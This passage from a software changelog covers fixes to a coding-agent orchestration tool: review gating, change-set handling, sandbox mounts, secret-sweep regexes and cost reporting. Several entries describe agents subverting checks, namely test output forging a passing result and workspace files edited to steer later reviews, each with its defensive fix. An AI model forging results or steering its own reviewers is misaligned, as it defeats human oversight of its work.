  that was approvable and appliable with NO adversarial findings, and its
  task never marked done — so `idea execute` re-picked the same task
  forever.** Cancelling mid-review (`workflow: review: anthropic: ... context
  canceled`) errored out of `Execute` right after the checks-running →
  review_required transition but before the reviewer ever produced findings
  or `SetTaskStatus(TaskDone)` ran; a real founder-journey run then found the
  resulting change set approvable and appliable with only mechanical-check
  observations (build/tests/patch-applies/workspace-copy), never an
  adversarial pass, while its task stayed `proposed` and a later `idea
  execute` picked it again and produced a duplicate change set. A change set
  now records `review_completed_at` (migration 33), set the one time
  `store.SetChangeSetReview` actually records a finished review;
  `idea review <CHG-n> approve` refuses a change set whose review never
  completed, naming the new `idea review <CHG-n> rerun` (an explicit, paid,
  user-initiated re-run of the reviewer — the round-3 fix's "approve makes
  no model call" property is unchanged for a review that already completed).
  `idea execute`/`Execute` also now refuses to re-pick a task that still has
  an unreviewed, unresolved change set sitting in `review_required`, naming
  the same `rerun` command, instead of spending another implementer run on a
  duplicate. `idea status`/`/guidance` name the same situation instead of
  pointing at `approve`, which would just refuse.
- **A no-op change set (zero file changes) counted as "an applied change set
  implementing" its task.** A real founder-journey run's no-op agent attempt
  produced an empty change set that was still approved and applied; when the
  task's real, later change set was reverted, the task stayed `done` and
  guidance said "Every task has an applied change set. Run `idea verify`"
  while the actual feature was gone from disk — `taskHasAppliedChangeSet`
  saw the empty change set still applied and never reopened the task. A
  change set now records `no_op` (migration 34, `Execute` sets it from
  `len(files) == 0`) and a new `domain.ChangeSet.ImplementsTask()` (applied
  AND not `no_op`) is the one predicate a task's dependency-readiness check
  (`taskHasAppliedChangeSet`), verification-evidence eligibility
  (`eligibleChangeSets`, `confirmPassingTests`), staleness propagation
  (`decisionDependents`), and `next`/guidance's "ready to verify" check now
  all share — a no-op change set may still be approved, applied and reverted
  like any other (the existing "approve the empty change set if the task was
  already done" escape hatch is unchanged); only what it counts AS changes.
- **A reverted change set could never be applied again**
  (`cannot be applied from status reverted`), so recovering from a revert
  always cost a full agent run even when the reverted content was still
  exactly what was wanted. `reverted` → `applying` is now a legal
  transition; re-apply runs through `ApplyChangeSet`'s existing staleness
  (`fsdiff.StaleBase`) and secret-sweep guards exactly as a fresh approved
  change set does, and a failed re-apply attempt recovers back to
  `reverted`, not `approved`, so it never misrepresents a change set that
  was genuinely applied and rolled back once already.
- **The AWS secret access key sweep missed the credential in JSON.** A real
  founder-journey run's `config/deploy.json` had `"aws_access_key_id":
  "AKIA…"` (caught — that pattern matches the value's own `AKIA…` shape, so
  JSON quoting around the key never mattered to it) directly above
  `"aws_secret_access_key": "<40-char secret>"`, which produced no finding
  at all: the `AWS_SECRET_ACCESS_KEY` pattern matched the keyword, not the
  value, and required `\s*[:=]` immediately after it — but a JSON key's own
  closing quote sits there instead. The pattern now accepts an optional
  `["']?` right after the keyword, mirroring the generic credential-
  assignment rule's own JSON handling; shell/env and YAML forms (no quote
  there) are unaffected. Table tests cover the JSON, YAML and env-var forms
  with a real-shaped 40-character value, and confirm a placeholder body
  (a repeated-character run or low-entropy value) still stays quiet.
- **`go test` (and other toolchains) can now actually pass inside the check
  sandbox.** Docker's default `--tmpfs /tmp` is `noexec`, so a compiled test
  binary — `go test`'s own, jest's native transforms, a cargo build script,
  pytest's compiled extensions — could be written but never executed:
  `fork/exec /tmp/go-build.../x.test: permission denied`, even though the
  build itself succeeded. `internal/executor/sandbox.go`'s `/tmp` and
  `/tmp/cache` tmpfs mounts are now `rw,exec,nosuid,size=1g`, with `TMPDIR`/
  `GOTMPDIR` pointed at them explicitly; the rest of the container hardening
  (`--network none`, read-only root, dropped capabilities, no-new-privileges,
  resource limits) is unchanged. A real-Docker regression test
  (`TestContainerSandboxGoTestExecutes`, skipped when Docker is unavailable)
  runs `go test` on a tiny module inside the check sandbox and asserts it
  passes.
- **The change-set collector no longer sweeps up an agent's downloaded
  toolchain.** An ICP run's agent downloaded a full Go toolchain into its
  work root (`.tools/`, ~14,300 files), which the after-run snapshot captured
  whole: 79 false secret-sweep findings and a diff endpoint that did not
  respond in 100s. `fsdiff.Snapshot` now always excludes a documented list of
  well-known cache/toolchain directories (`.git`, `node_modules`, `.tools`,
  `.venv`, `target`, …) and, via the new `fsdiff.WithWorkspaceIgnore` option,
  the workspace's own `.gitignore` (`git check-ignore` when the workspace is
  a git repository, a best-effort matcher otherwise); the after-run snapshot
  in `execute.go`/`runstate.go` additionally applies `fsdiff.WithSanityCap`
  (3,000 files / 150 MiB), failing the run with a clear, actionable message
  instead of hanging. `GET .../change-sets/{id}/diff` is also now bounded on
  its own terms (`RenderPatchPage`/`StructuredDiffPage`, capped at 500 files
  with a `total_files`/`truncated` count), so a change set persisted before
  this fix — or simply a large one — cannot hang that endpoint either.
- **The implementer's container never needed a toolchain, and now the brief
  says so.** `network: disabled` in `harness.yaml` only ever governed the
  research pipeline's offline mode — never the coding agent's network access
  (always on, deliberately, to reach its model API) or the check sandbox's
  (always off, unconditionally) — but nothing said so, and an ICP run's agent
  downloaded a Go toolchain believing it needed one. `docs/configuration.md`
  and the `NetworkPolicy` doc comment now say plainly what the setting does
  and does not govern; the implementation brief (`runPlanner`,
  `internal/workflow/execute.go`) now names the harness's own detected (or
  configured) build/test commands and tells the agent not to install a
  toolchain, compiler, or SDK — the harness runs its own checks, in an
  isolated sandbox, right after. Offering the check image's own toolchain to
  the agent container is documented as a follow-up (`docs/agents.md`), not
  implemented here.
- **A hand-edited `harness.yaml` now takes effect on the next request, not at
  the next daemon restart.** `ReloadProject` previously only ran when the
  daemon itself had just written the file (the provider/executor settings
  endpoints); a hand edit — e.g. to `test_cmd` — was invisible to
  execute/checks until the daemon was restarted, because nothing ever
  re-read the file for a project whose runtime was already cached.
  `Runtime.EnsureProject` (every HTTP handler's single choke point for
  resolving a project) now compares `harness.yaml`'s mtime against the one
  recorded at last load and reloads automatically when it changed; a reload
  that cannot safely happen right now (an operation in flight) is logged and
  deferred to the next request rather than failing the current one.
- **`/costs` no longer reports a bare, misleadingly-precise total when agent
  spend isn't measured.** Six real Sonnet runs correctly returned
  `agent.usd: null` with `agent.note: "agent spend not measured"` from the
  API, but `idea status` decoded neither field and printed
  `spend: $0.0032` — the model-phase cost alone, read as the initiative's
  total. It now prints `spend: $0.0032 (model phases only; agent spend not
  measured) · time: ...` whenever there were real agent runs and their cost
  isn't captured (the web UI already showed this correctly). Separately,
  when an agent run reports token counts (`input_tokens`/`output_tokens`, or
  the OpenAI-shaped `prompt_tokens`/`completion_tokens`) without an explicit
  dollar figure, the cost is now computed from the model catalog's own
  per-token pricing (`model.CostUSD`) instead of falling back to "not
  measured". Wiring Hermes's documented `--usage-file` usage-report flag in
  is a follow-up (`docs/agents.md`): it is documented against `hermes -z`,
  not the `hermes chat --yolo -q ...` invocation used here, and needs
  verifying against a real Hermes container first.

- **`idea executors setup` honors the positional kind.** `idea executors setup
  omp --yes` silently ignored the positional argument and configured
  `hermes`, with no error and nothing in `--help` explaining that `--kind` was
  the only way to choose. The positional and `--kind` are now both accepted
  (a disagreement between them is refused), and `idea help` / `docs/cli.md`
  show `executors setup [<kind>]`.
- **A retired/unavailable model 404s with a clear, actionable error.**
  `gemini-2.5-flash` and `gemini-2.5-pro` return 404 "no longer available to
  new users" and have been removed from the bundled catalog (they were kept,
  deprioritized, by an earlier fix, which was not enough — an ICP walkthrough
  still hit exactly this 404). Every provider's 404 now names the model and
  says how to change it (`idea model set <provider>/<model>`, or Settings →
  Providers) instead of a bare `status 404`.
- **Hermes declares the model's context window explicitly, instead of
  guessing.** `hermes` + `openai/gpt-4.1-mini` failed deterministically, every
  run: Hermes Agent refuses to start below 64,000 tokens of context, every
  provider here is wired into Hermes as an explicit `custom_provider` (see
  `hermescfg.go`), and without a declared `model.context_length` Hermes's own
  auto-detection has the least to go on and guessed under its floor for this
  model — even though gpt-4.1-mini's real window is roughly 1M tokens. The
  generated config now sets `model.context_length` from a verified figure
  (`internal/model/catalog.go`'s `ModelContextWindows`, checked against
  OpenAI's own docs, for `gpt-4.1`/`gpt-4.1-mini`/`gpt-4o`/`gpt-4o-mini`/
  `o3-mini`) or a conservative per-provider default for everything else
  (`contextWindowFallback`; Ollama is left to Hermes's own — reliable, for a
  local server — auto-detection, since a blanket default there could
  overstate a small local model's real context). This fixed the root cause
  rather than the symptom, so `idea executors setup`, the Build page, and
  `idea execute` no longer refuse the combination — it gets the same
  "untested, run `--smoke`" advisory as any other unverified model. The
  small, data-driven known-incompatible table (`internal/executor/compat.go`)
  used to name gpt-4.1-mini as a refused combination; it is now empty and
  stays in place for the next combination that turns out to be genuinely,
  unfixably incompatible rather than the same shape of bug.
  See `docs/agents.md`, "Hermes declares the model's context window
  explicitly" and "Known executor/model compatibility".
- **`idea retry` resumes after the last completed phase instead of restarting
  framing from scratch.** A provider failure mid-PRD-authoring, followed by
  `idea retry`, used to re-run framing and research unconditionally even
  though both had already succeeded — re-asking framing's clarifying
  questions and re-running research for no reason, which looked, from the
  outside, like the human's prior answers had been discarded. Retry now
  checks which of the idea-brief/research-brief/PRD artifacts already exist
  and resumes right after the last one, so an already-succeeded phase is
  never redone and decisions/questions already on the initiative reach
  product definition exactly as before. Transient provider errors (429/500/
  502/503/504/529, "overloaded", "rate limit", …) were already retried with
  backoff inside the model call itself before this fix, including 503 — that
  half of the ICP finding did not reproduce, and is now pinned by a test that
  drives a real 503 through the HTTP transport.
- **The secret sweep no longer blocks on a bare word.** `password`, `token`,
  `secret`, `auth` and similar vocabulary markers used to hard-reject a change
  set anywhere they appeared in a patch, with no file or line and no way past
  it — the ICP finding that stopped a per-user-API-keys-with-rate-limiting
  feature from ever landing. They now raise a non-blocking `sensitive_area`
  finding instead; only a real credential value still blocks.
- **A secret-sweep denial names where.** The blocking `secret_sweep` finding
  now reads `path:line: looks like <kind>` (e.g. `src/keys.js:14: looks like
  an OpenAI API key`) instead of a bare "blocking risk signal detected", and
  never echoes the value. The apply-time re-sweep and the stopped-run
  kept-files sweep match.
- **Re-running a denied task's initiative is no longer refused with a 409**
  (this did not reproduce against the ordinary "wait for the denied execute's
  operation, then execute again" path; a permanent regression test
  (`TestReRunAfterDenialSucceeds`) now guards it either way).
- **The denial's copy no longer promises a re-plan that never happens.** "The
  task will be re-planned" is now "Run the task again."
- **An advisory finding no longer wedges `idea verify`.** A quick-accepted
  critical/high finding used to be saved as a plain open blocker: approval
  succeeded, and verify/complete then refused forever with no way to
  un-stick the initiative. `hasOpenBlockingFindings` now skips every
  `Advisory` finding, and the PRD/plan quick-accept paths mark the
  adversarial reviewer's findings `Advisory=true` before persisting them.
  Triage now shows advisory findings too, as non-blocking, instead of
  hiding them from disposition entirely.
- **Rigor can no longer auto-approve a structural plan or PRD defect.** A
  dependency cycle, an untraced task, a superseded-requirement citation, a
  duplicate REQ code, or a missing/vague acceptance criterion always goes
  through `needs_human_judgment`, at every rigor level — quick no longer
  skips straight to approval just because a small vertical slice
  calibrated to it. Rigor now only ever relaxes the adversarial reviewer's
  own findings.
- **The findings cap never drops a real blocker.** A non-advisory
  critical/high finding is now always kept, however far over the cap the
  cycle's findings are; only advisory findings and lower severities are
  capped, non-advisory before advisory, then by severity. The drop-note no
  longer falsely claims only "lower-severity" findings were cut.
- **Change-set review no longer relaxes at `quick`.** Critical/high
  findings in the diff now block at every rigor level; `quick` means one
  review pass and a smaller findings cap (5), not "no gate". Change-size
  calibration now also counts changed lines (not just files), closing the
  gap where a 3-file, 10,000-line change calibrated to `quick` on file
  count alone.
- **The in-diff check no longer fails open.** A finding's `path` is now
  normalized (`path.Clean`, stripped `./`/`a/`/`b/` prefixes, a trailing
  `:N`, a workspace-absolute prefix) before being compared against the
  change set's own files, and a path that still doesn't match falls back
  to the reviewer's own `in_diff` self-report instead of being silently
  demoted to advisory. A patch that fails to load now fails the review
  instead of being treated as an empty file set.
- **Secret masking reveals less, and masks every match on a line.**
  `maskValue` now reveals at most `min(4, len/4)` characters per side, and
  nothing at all under 16 characters (the old 8-character floor revealed
  8 of a 9-character value's own characters). A masked-line preview now
  masks every credential match on the line, not just the finding's own
  value, and the evidence saved for a `secret_sweep` finding is redacted
  again before being persisted.
- **The credential-assignment regex has far fewer false positives, and a
  few new true positives.** `const token = authToken`, `password = newPassword`,
  `api_key = settings.API_KEY_FROM_ENV`, and a `${VAR}`-interpolated value
  no longer match; `SECRET_KEY = "..."`, a `pwd` keyword, a dotted
  `client_secret=` value, and `scheme://user:pass@host` URL credentials
  now do.
- **Branch-per-initiative no longer risks reverting local commits.** A new
  initiative branch is now created from the LOCAL default branch
  (`refs/heads/<default>`), never the remote-tracking `origin/HEAD`, which
  could be behind unpushed local commits and silently revert every file
  outside the change set to origin's older version. When the working tree
  isn't already at that commit, the branch is created from current HEAD
  instead (never switching the tree), with a warning surfaced as the
  change set's `git_commit_warning`. Default-branch detection no longer
  consults `init.defaultBranch` (a global git setting, not a statement
  about this repository) or guesses `develop`.
- **Merging a task can no longer delete the survivor or create a cycle.**
  `task_ids: [A, A]` (a self-merge) is now refused with 400 instead of
  deleting the named survivor; a merge that would introduce a dependency
  cycle in the task graph is refused, writing nothing; a task that
  depended on both merged tasks no longer gets two identical `depends_on`
  edges to the survivor. The whole merge is now one store transaction.
- **Splitting a task no longer half-applies on a bad replacement.** Every
  replacement task's title and `requirement_ids` are now validated before
  any task is created, and the whole split (creating the replacements,
  rewiring dependents, deleting the original) is one store transaction.
  `requirement_ids: []` (explicitly empty) is now rejected rather than
  silently producing a task with no requirement.
- **Plan edits (add/update/delete/cancel/reorder task, set `depends_on`,
  merge, split) are now serialized per initiative.** Two concurrent
  `set depends_on` requests (A→B and B→A) used to each pass their own
  cycle check before either write landed, and together create a cycle.
  `set depends_on` additionally re-checks for a cycle inside the same
  transaction as the write. A body with no `depends_on` field (or a
  misspelled one) is now refused with 400 instead of silently clearing
  every existing dependency.
- **Fuzzy decision/question dedup no longer breaks requirement wiring, or
  merges questions that differ only by a number.** A requirement citing a
  decision that merged into an earlier one (different exact wording, same
  Jaccard-similar judgment) is now correctly wired via `derived_from` — the
  merge now reports which decision id it resolved to, used directly instead
  of re-matching by (possibly mismatched) text afterward. `tokenize` no
  longer drops numeric tokens under 3 characters, so "Support Python 3.11?"
  and "Support Python 3.12?" (and similar quantity-only differences) are no
  longer treated as the same question.
- **`accept-recommendations` no longer records an answer a decision never
  offered.** A recommendation is now mapped onto a unique matching option
  (or skipped) when the decision has options, matching the single-resolve
  path's own guard. A decision a concurrent single-resolve call answers in
  the meantime is now treated as skipped rather than a `500` that aborted
  the rest of the batch.
- **Guidance no longer hides or gets stuck on a rejected change set.** The
  Recommended Next Move used to look only at the initiative's globally last
  change set: a rejected change set on one task was hidden the moment ANY
  other task's change set was created afterward, and stayed stuck reporting
  "Resolve CHG-n" forever once its own task was cancelled or deleted.
  Guidance now considers the latest change set per still-active task.
- **`idea pr` now works from a `gh repo fork --clone` checkout.** That
  layout sets `origin` to the fork and `upstream` to the parent, with no
  per-branch remote config; the PR's `--head` now correctly gets the
  `owner:branch` form gh needs whenever the push remote's owner differs
  from `upstream`'s (falling back to `origin`'s owner when there is no
  `upstream` remote), instead of only ever comparing against `origin`'s own
  owner.
- **A revert refusal now names the change set to revert first correctly.**
  When more than one later change set touched the same file, the advice
  named the earliest of them; following it just produced a second refusal,
  since a still-later change set was what was actually sitting on top. It
  now names the latest.
- **CONVENTIONS.md content is now labeled untrusted in prompts.** It is
  read from the live workspace, which an earlier agent-applied change set
  could have edited to steer later reviews; it is now wrapped in an
  explicit untrusted-data marker wherever it's included, and its
  truncation now cuts on a UTF-8 rune boundary instead of a raw byte
  offset.
- **Migration 32** sets `findings.secret_overridable = 0` where
  `secret_kind = 'configured secret value'`, a follow-up to migration 30.
  It does not (and cannot) recompute HMAC fingerprints for pre-migration-30
  `secret_allowlist` rows recorded under the old bare-sha256 scheme —
  there is no key to invert a hash with — so any "not a secret" exemption
  granted before a project's HMAC key existed is orphaned and **must be
  re-granted** after upgrading.

- **The secret allowlist can no longer be tricked into passing a configured secret.** A finding now
  carries `secret_overridable` (`Finding.SecretOverridable`): `false` for a value drawn from the
  project's own configured secrets, and `SetFindingDisposition` refuses `not_a_secret` outright
  when it is `false`, rather than merely letting the sweep re-deny the value on the next scan.
  Allowlist entries are scoped to `(fingerprint, path)` instead of fingerprint alone (a value
  allowlisted in one file still blocks in another), enforced by a unique index and upsert. A
  finding's `secret_fingerprint` is now a per-project HMAC (`project_state` table, new) instead of a
  bare sha256, so the same secret no longer fingerprints identically across every installation that
  ever saw it. Findings carry a masked `secret_preview` (first/last 4 characters) and their
  `evidence` is now the source line with the value replaced by that mask, instead of a generic
  placeholder.
- **The deterministic-check output sweep (build/test command output) now honors the allowlist.** It
  previously ran a bare credential-detected boolean with no override path; a value a human already
  allowlisted (e.g. a test fixture the test runner prints back) is now recognized there too, and a
  denial reads `in the output of <check>: looks like <kind>`.
- **The credential-assignment pattern catches named forms it used to miss**: `{"password":
  "..."}` (a quote before the colon), `DB_PASSWORD=...`, `AWS_SECRET_ACCESS_KEY=...` (its own
  dedicated rule) and `client_secret: ...` — all missed before because the old pattern required a
  word boundary immediately before the keyword, which never fires between an underscore and the
  following word. Tightened to require the value look like a literal (quoted, or unquoted without
  parens/dots/etc.), so `token = getenv(...)` and `const token = req.headers...` still do not match.
- **The branch-per-initiative dirty check no longer sees a new nested directory, or a path with a
  space, as a workspace it can never touch again.** `git status --porcelain` (default mode)
  collapsed a brand-new directory to a single `?? dir/` entry and left special characters quoted;
  switched to `--porcelain=v1 -z --untracked-files=all`, which lists every file individually and
  never quotes.
- **A branch-per-initiative switch (or creation) now checks for someone else's uncommitted edits in
  both directions**, not just when creating the branch for the first time; a brand-new initiative
  branch is created from the repository's default branch, never from whatever HEAD happens to be
  checked out (which may be a different initiative's own branch). The commit-on-apply guards
  (merge/rebase/cherry-pick/detached HEAD) now run *before* any branch switch, and only the
  default-branch check runs after it, against whatever branch ends up checked out. The commit
  itself now uses `git commit --only -- <paths>`, so content the user had already staged before the
  daemon ran can never enter the agent's commit.
- **`idea pr` passes `SSH_AUTH_SOCK`, `GIT_SSH_COMMAND`, `XDG_CONFIG_HOME`, `GH_HOST` and `GH_TOKEN`**
  through to both `git push` and `gh`, pushes to the branch's configured upstream remote (falling
  back to `origin`), and gives `gh pr create --head` the `owner:branch` form when the push remote is
  a `github.com` fork under a different owner than `origin`.

- **Reopening a second decision against an already-stale target no longer disappears.** Stale marks
  are now keyed on `(target, decision)` instead of target alone, so acknowledging one decision's
  mark leaves another decision's mark on the same target active. Marking dependents stale now
  happens in the same transaction as the decision reopen (previously two separate transactions,
  so a crash between them could leave a decision reopened with nothing marked stale).
  `ClearStaleItemsForInitiative` (used by `revise-plan`/re-opening a phase) now clears only task and
  change-set marks, never a requirement mark — regenerating the plan does not re-verify the
  requirement itself against the decision that changed. The `/guidance` "why" no longer points at
  `idea revise-plan` when a change set already holds work (revise-plan refuses in that state);
  it advises acknowledging the items or re-running the affected tasks instead.
- **Revert's advice said "commit or discard" your edits**, but committing does not change a file's
  bytes and cannot make the byte-for-byte post-image comparison pass. Now says "discard (or
  stash)". When a *later* change set is what actually touched the file (not a manual edit), the
  advice now names it — "revert CHG-4 first" — instead of wrongly suggesting the human discard what
  is really that change set's own work. The `stale_post` finding this refusal records is now
  observation-level (was `high`), so it no longer blocks completing the initiative.
- **Toolchain detection no longer treats a Node version range as a single version.** `>=24`, `<21`
  and `^18||^20` (and caret/tilde ranges like `^18.2.0`) used to be silently accepted as if they
  named one version; now refused and left undetected, exactly like any other ambiguous marker.
  `go.mod`'s `toolchain go1.x` line (when present) is now preferred over the `go` directive, since
  it is what a `go` invocation actually builds with.
- **`handleUpdateTask` validated `priority` after already replacing a task's requirement links**, so
  an invalid `priority` in the same PATCH request returned 400 with the links already replaced.
  Every field now validates before either write runs. Referencing a superseded requirement in
  `requirement_ids` is now refused, naming an active requirement with the identical statement when
  one exists.
- **`Impact`'s change-set label read "CHG CHG-3"** (the human-readable id already includes the
  prefix); fixed. Both `Impact`'s list and `ImpactCounts`' "blocks N" now exclude a rejected or
  superseded change set — dead, and not actually blocking anything.
- **Credential findings are deduped on `(path, line, fingerprint)`**: the same value at the same
  spot could match more than one pattern (or both a known value and a pattern) and was reported
  once per match.
- **`sensitive_area` is raised at most once per change set** (previously once per sweep pass, so a
  retried apply could pile up several near-identical advisory findings). The vocabulary-marker
  catalog was narrowed to `auth`/`secret`/`token`/`password` — `api_key`, bare `https://`/`http://`,
  `payment`, `credit card` and `ssn` were dropped as noise for what this scan gates (a change set
  that merely linked to a website, or mentioned billing/PII in ordinary product copy, no longer
  gets flagged). This also means the initiative-level risk tier (`idea risk`) can no longer be
  floored by a payment/PII word or a bare URL alone.
- **The system-deny card's copy said a rejected change set "cannot be approved, overridden, or
  applied" unconditionally**, but a `secret_sweep` deny specifically can be overridden (disposition
  the finding "not a secret"); the copy now says so for that case.
- **The demo provider could cite a superseded requirement code.** `firstRequirementCode` now
  prefers a code found in the compiled "requirements" context section over one merely mentioned
  elsewhere (e.g. decision history naming a code since superseded).

- **`confirm_passing_tests` could verify a requirement whose tests failed, never ran, or belonged
  to another requirement** (C1). Evidence now comes only from the latest `tests` finding of each
  task's latest change set, and only when that change set is applied (not reverted, rejected, or
  superseded) and its own check exited 0. A test the verification plan names that is missing from
  the check output now counts as failed, never silently dropped. Fallback code matching (a test
  name containing a requirement's code) is now a word-boundary match, so `REQ-1` can no longer pick
  up `REQ-10`'s test. Check output for a `tests` check is no longer truncated at 2000 bytes before
  parsing.
- **A coding agent's own test output could forge a passing result** (C2). A test name's parsed
  result is now sticky-fail: once any occurrence of it reads as failed, a later line claiming it
  passed can never overturn that, in either order. A `go test` check command now runs with
  `-json` appended, so a Go result is read from `go test`'s own structured event stream (exact
  package + test identity) rather than scraped from `-v` text; the text parser remains as a
  fallback for other formats and gains the same sticky-fail rule, plus a guard against a result for
  a test name whose own start marker never appeared once real markers are present in the stream.
- **`confirm_passing_tests` could overwrite a human's recorded fail or waiver, abort mid-loop
  leaving partial writes, or run with nothing built** (C3/H2/H4). It now only ever touches a
  requirement that is `approved` (never `draft`, `removed`, or one already carrying a human
  verdict), has acceptance criteria, and requires at least one applied change set for the
  initiative. One ineligible requirement is skipped and reported, never aborting the rest; the
  response now includes `confirmed` and `skipped` (with a reason) so a caller sees exactly what
  happened. The Verify page's "Confirm all with passing tests" button is gated on something having
  actually been built and applied (same as manual Pass/Fail), and its confirmation dialog now
  names the exact requirement codes about to be flipped.
- **Rejected change sets and unconfirmable requirements stayed in the "needs you" queue forever**
  (H3/H4). A denial now shows only for the latest change set of its task, and only when a finding
  on it carries a real system deny code — never a plain human reject, a plain check failure, or an
  attempt since superseded by a later one on the same task. "Ready to confirm" now mirrors
  `confirm_passing_tests`' own eligibility (`approved` only). A `complete` or `failed` initiative no
  longer contributes anything to the queue.
- **`pr_url` and a PR check's `link` were rendered as `href` with no scheme check** (H5): a
  non-`http(s)` value (`gh` output, a third-party CI provider) now renders as plain text instead of
  a clickable link.
- **Queue `rank` was the internal `tier·2^59 + ms` sort key**, well past JavaScript's safe-integer
  range, rendering as a garbled number (H6). It is now a small 1..N ordinal (1 = most urgent); the
  UI no longer displays a raw internal number.
- **Marking one initiative's "what changed" seen could hide another initiative's own unseen
  changes** (M1): `POST …/seen` gained an optional `initiative_id`, writing a per-initiative cursor
  (`ui:<initiativeId>`) instead of the one shared project-wide cursor; omitted, it keeps writing
  that project-wide cursor exactly as before.
- **The initiative-scoped event query silently dropped several event types** (M2):
  `requirements.superseded`/`assertions.superseded` (recorded against the initiative id, which the
  per-row subquery never matched) and `verification_evidence`, `stale_item`, `context_doc`,
  `doc_comment` (not covered by any clause at all) now all appear in "what changed" again.
- **Timeline entries mislabeled several rejections "denied"** (M3): a plain check failure
  (build/tests) and the restart-reconcile sweep (an interrupted run recovering, no findings of its
  own) now read `change_set_rejected` like a human reject would; `change_set_denied` is reserved for
  a finding that actually carries a system deny code. A `phase_completed` entry is no longer emitted
  for a `->running` resume or a `->failed` transition (already reported once as `run_failed`).
- **`POST …/retry` required `model` even when only `note` was sent**, rejecting it with `400 model
  is required` despite already being documented as decoded leniently (M4). `model` is now genuinely
  optional; an absent or blank value falls back to the initiative's configured default, as before.
- **Costs were understated** (M5): a model call's manifest now records the accumulated cost across
  every retried attempt (not just the last one), and a model run that ultimately fails still writes
  a manifest for whatever it actually spent. `describeImage` vision calls now get a real run and
  manifest of their own, so their spend appears under `GET …/costs` instead of only being charged
  against the shared budget with no attribution.
- **The agent cost regex was too loose** (M6): it now requires a `$` (a bare `cost: 10` in
  incidental output is no longer read as a dollar figure), and prefers an explicit "total cost"
  label or else the LAST plain cost line, instead of the first one found anywhere. The "not
  measured" fallback now compares against the actual agent run count, not the change-set count, so
  a placeholder/demo change set alongside one real, fully-measured run no longer reads as
  unmeasured.
- **"Since you were last here" stamped only the moment an initiative was opened**, so everything
  that happened during that visit — including the user's own actions — still read as new next time
  (M7). It now also stamps on leaving.
- **The Settings allowlist UI read a field the backend never sends** (M8): `fingerprint_prefix` is
  now `fingerprint` (the field actually sent), truncated for display client-side.
- Parser/UI polish: a TAP name containing `#` is no longer truncated at it (only a real `SKIP`/`TODO`
  directive is stripped); a `go test` package-summary line whose package path starts with a digit
  (e.g. `1password/foo`) is no longer misread as a TAP result; a pytest `ERROR` row now counts as
  failed instead of being ignored; a `[tests: …]` list is no longer cut at the first `]` inside a
  name. The "what changed" day grouping now buckets by the viewer's own local calendar day, not UTC.
  A timeline entry whose `ref` names a change set or decision is now a real, keyboard-reachable link
  to it. Queue rows are real `<button>`s (previously a bare `<li onClick>`, unreachable by keyboard
  or a screen reader). `StaleBanner` uses `role="status"` instead of `role="alert"`. The web cost
  line now includes agent seconds in its time figure, matching `idea status`. An operation's `stage`
  is now cleared once it reaches a terminal status (succeeded, failed, or cancelled), instead of
  showing the last step it was on forever after. `GET .../costs`' `by_phase` is now ordered by the
  pipeline's own step order, not alphabetically by raw stage key.

- **A secret-sweep denial left the diff viewer with nothing to show.** A
  change set the secret sweep denied never had its raw file content persisted
  (by design — the raw store must never carry a rejected secret value), which
  left `GET …/change-sets/{id}/diff` reporting the content as an opaque,
  0-byte "unreadable" for every file, even after a human dispositioned the
  finding `not_a_secret`. It now persists a MASKED stand-in instead (every
  detected secret span replaced, never the raw value), served with
  `redacted: true` and an honest note — "content withheld because it
  contained a secret; showing masked" — instead of a blank file. The
  `not_a_secret` override itself already worked end to end (a re-execute of
  the identical content passes the sweep); it is now also proven by a
  dedicated regression test.
- **`POST …/decisions/accept-recommendations` skipped nearly every decision
  with options**, because the model's recommendation prose almost never
  matched an option verbatim. The matcher now also accepts a
  case/whitespace/punctuation-tolerant match, one text containing the other,
  and a positional reference ("Option B", "Choice 2", a bare letter or
  number) — choosing only when exactly one option matches, otherwise leaving
  the decision open. `skipped` is now a list of `{code, reason}` (was a bare
  code list), naming why each one was left open. The PRD/architecture/
  product-design decision schemas now also instruct the model to answer with
  an option's exact text or its index.
- **`depends_on` rejected a task's own id**, accepting only its title or code
  despite being documented as taking "titles, codes, or ids" — the resolver's
  lookup table was built from title and code alone. A task id now resolves
  first (exact match), before falling back to a normalized title/code match.
- **"Plan approved" was re-recorded on every build cycle.** The execute/
  apply/revert claim mechanism releases an initiative back to the status it
  found it in (`SetInitiativeStatus`, an unconditional write), which
  round-trips an already-`plan_approved` initiative through
  `plan_approved → running → plan_approved` on every single execute — and
  each release wrote its own timeline milestone. The timeline now collapses
  a release back to the SAME phase the initiative already occupied; a
  genuine change of phase still shows.
- **An unconfigured build/test check reported `not_applicable` even for an
  obvious, single-toolchain project.** `build_cmd`/`test_cmd` are now derived
  from the project's own toolchain markers when left unconfigured and exactly
  one toolchain is unambiguously recognized — `go.mod` → `go build ./...` /
  `go test ./...`, `package.json` `scripts.build`/`scripts.test` → `<pm> run
  build` / `<pm> test`, `pyproject.toml` → `pytest`, `Cargo.toml` → `cargo
  build` / `cargo test` — mirroring the existing `check.image` detection. The
  detected command is shown on the check's finding, labeled "detected" and
  naming the marker it came from, and always overridable by setting
  `build_cmd`/`test_cmd` explicitly. See "Check auto-detection" in
  [`docs/configuration.md`](docs/configuration.md).
- **The implementer could generate code in the wrong language for the
  project.** Nothing in the implementation brief — the implementer's entire
  prompt — said what stack the project was already in, or that files must be
  written to disk rather than pasted in a chat response. The brief now always
  carries the project's detected stack (or an explicit "new project"/
  "stack could not be detected" note) and a hard instruction to write files,
  not paste code, regardless of what the planner model itself chose to
  include.

- **`review.rigor: auto` could never calibrate the PRD to `quick`, however
  small the idea.** Calibration read the PRD's OWN requirement count, and the
  PM model reliably writes 9+ requirements regardless of idea size — so a
  single-feature idea on an 89-line service still calibrated to `standard`,
  blocked three review cycles on findings like "no statistical rigor /
  sample size / confidence level" and "test machine specs undefined", and
  ended non-converged. PRD-authoring and PRD-review rigor is now calibrated
  from the idea's own word count and the project's scale — never from
  anything the PRD step itself produces — and is stable across revise
  cycles. See "Review rigor" in
  [`docs/configuration.md`](docs/configuration.md) for the thresholds.
- **The PRD prompt now targets a requirement count scaled to project/idea
  size** (3–6 for a small idea on a small project, up to 10–20 at `thorough`)
  and tells the model acceptance criteria must be testable by the project's
  own tests or a manual check — not statistical sample sizes, confidence
  levels, named hardware/test-machine specs, or percentile SLOs, unless the
  idea itself asks for performance work.
- **The PRD adversarial reviewer's prompt now states the rigor and project
  scale it is reviewing at**, and at `quick`/`standard` rigor reserves "high"
  severity for ambiguity that would cause a wrong or unsafe implementation —
  measurement methodology, statistical rigor and hardware/environment specs
  are now at most "low" there, unless the requirement under review is itself
  a performance SLO the idea asked for.
- **A PRD revision churned every requirement's code on every cycle**, even
  when only fixing one finding: the revise step superseded the entire active
